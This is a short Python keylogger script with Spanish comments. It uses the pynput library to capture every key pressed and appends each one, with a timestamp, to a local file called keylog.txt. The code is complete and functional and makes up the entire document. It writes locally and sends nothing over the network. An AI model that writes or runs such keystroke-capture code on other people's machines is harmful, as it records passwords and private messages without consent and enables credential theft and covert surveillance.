from pynput.keyboard import Key, Listener
from datetime import datetime

# Función que registra cada tecla presionada
def on_press(key):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')  # Fecha y hora actual
    try:
        # Si es un carácter imprimible, lo guarda como tal
        with open("keylog.txt", "a") as file:
            file.write(f"{timestamp} - {key.char}\n")
    except AttributeError:
        # Si es una tecla especial, la guarda como Key.<nombre>
        with open("keylog.txt", "a") as file:
            file.write(f"{timestamp} - {key}\n")

# Inicializa el listener para capturar las teclas
with Listener(on_press=on_press) as listener:
    listener.join()
